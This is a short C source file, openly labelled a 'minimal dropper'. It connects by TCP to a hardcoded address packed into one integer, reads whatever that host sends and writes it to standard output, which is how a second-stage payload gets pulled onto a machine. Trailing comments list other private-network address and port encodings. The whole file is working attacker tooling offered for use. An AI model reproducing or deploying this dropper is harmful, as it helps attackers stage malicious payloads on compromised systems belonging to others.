/*
 *  nwget. NanoWget. Minimal dropper in C
 *  Copyright (c) 2020 pico (@0x00pico at twitter)
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <stdio.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define BUF_SIZE 1024

int main (void) {
  int                s, l;
  unsigned long      addr =  0x0100007f11110002; // Define IP the hacker way :)
  unsigned char      buf[BUF_SIZE];

  
  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) return -2;
  if (connect (s, (struct sockaddr*)&addr, 16) < 0)         return -3;
  
  while (1) {
    if ((l = read (s, buf, BUF_SIZE) ) <= 0) break;
    write (1, buf, l);
    if (l < BUF_SIZE) break;
  }
  close (s);
  
  return 0;
  
}
// 8c0aa8c034120002 -- 192.168.10.140 (0x8c0aa8c0)  4660 (0x1234)
// 8c0aa8c021430002 -- 192.168.10.140 (0x8c0aa8c0) 17185 (0x4321)
//                      c0. a8.0a. 8c
